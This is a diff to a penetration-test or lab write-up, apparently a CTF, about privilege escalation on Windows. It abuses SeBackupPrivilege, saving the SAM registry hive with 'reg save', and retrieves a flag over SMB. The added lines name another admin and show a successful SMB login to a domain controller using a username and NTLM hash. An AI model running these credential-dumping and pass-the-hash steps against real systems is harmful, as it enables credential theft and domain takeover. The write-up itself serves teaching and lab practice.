@@ -458,6 +458,8 @@ So none of these credenatials are valid so ill keep enumerating in my RDP sessio
 # Abusing SeBackupPrivilege on windows workstation
 After opening powershell as as an administrator and checking privs i have the `SeBackupPrivilege` 
 
+Also another admin on this workstation is `bbarkinson`
+
 ```python
 PS C:\> reg save hklm\sam c:\Share\sam
 The operation completed successfully.
@@ -571,3 +573,11 @@ getting file \Users\Administrator\Desktop\user2.txt of size 118 as user2.txt (0.
 smb: \Users\Administrator\Desktop\>
 ```
 I got access as the administrator
+
+
+# Initial access on the domain controller
+```python
+
+
+SMB         10.0.22.198     445    DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc
+```
